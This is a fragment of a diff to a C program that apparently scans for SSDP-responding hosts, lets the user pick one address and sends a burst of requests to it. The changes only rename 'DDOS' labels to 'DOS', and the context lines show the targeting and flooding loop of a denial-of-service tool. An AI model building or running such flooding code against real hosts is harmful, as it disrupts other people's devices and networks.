@@ -235,7 +235,7 @@ int main(void) {
   counter = sockaddr_in_filter(&responds_sock_in, counter);
 
   // Displays address, prints self addr
-  printf("Choose address to DDOS:\n");
+  printf("Choose address to DOS:\n");
   printf("0\tExit.\n");
   for(int i = 0, w = 1; i < counter; i++, w++) {
       printf("%d\t%s\n", w, inet_ntoa(responds_sock_in[i].sin_addr));
@@ -257,7 +257,7 @@ int main(void) {
     goto End;
   }
 
-  // DDOS choosen_one address
+  // DOS choosen_one address
   struct sockaddr_in choosen_one = responds_sock_in[choice - 1];
   choosen_one.sin_port = htons(SSDP_PORT); // fix no_port
   printf("Sending %d requests to %s:\n", MAX_REQUEST, inet_ntoa(choosen_one.sin_addr));
@@ -273,7 +273,7 @@ int main(void) {
 		 sizeof(choosen_one));
 
     if (err == -1) {
-      perror("Error DDOSing.\n");
+      perror("Error DOSing.\n");
       counter = MAX_REQUEST;
     }
     counter++;
